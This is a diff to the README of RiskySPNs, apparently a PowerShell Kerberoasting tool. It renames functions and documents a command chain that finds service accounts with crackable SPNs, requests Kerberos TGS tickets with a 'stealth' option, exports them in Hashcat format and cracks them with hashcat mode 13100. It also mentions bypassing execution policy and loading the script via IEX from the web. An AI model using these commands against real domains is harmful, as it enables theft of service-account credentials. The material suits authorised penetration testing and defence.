@@ -8,7 +8,7 @@ Import-Module .\RiskySPNs.psm1
 ```
 Or just load the script (you can also `IEX` from web):
 ```powershell
-. .\Get-PotentiallyCrackableAccounts.ps1
+. .\Find-PotentiallyCrackableAccounts.ps1
 ```
 Make sure `Set-ExecutionPolicy` is `Unrestricted` or `Bypass`
 ##### Get information about a function
@@ -20,13 +20,13 @@ All fucntions also have `-Verbose` mode
 #### Search vulnerable SPNs
 **Find vulnerable accounts:**
 ```powershell
-Get-PotentiallyCrackableAccounts
+Find-PotentiallyCrackableAccounts
 ```
 Sensitive + RC4 = $$$
 
 **Generate full deatiled report about vulnerable accounts (CISO <3)**
 ```powershell
-Report-PotentiallyCrackableAccounts
+Export-PotentiallyCrackableAccounts
 ```
 #### Get tickets
 **Request Kerberos TGS for SPN**
@@ -36,12 +36,12 @@ Get-TGSCipher -SPN "MSSQLSvc/prodDB.company.com:1433"
 
 Or:
 ```powershell
-Get-PotentiallyCrackableAccounts -GetSPNs | Get-TGSCipher
+Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher
 ```
 #### The fun stuff :)
 
 ```powershell
-Get-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -DoNotQuery -ConvertTo "Hashcat" -SaveTo c:\crack.txt" 
+Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -ConvertTo "Hashcat" | Out-File crack.txt
 oclHashcat64.exe -m 13100 crack.txt -a 3
 ```
 
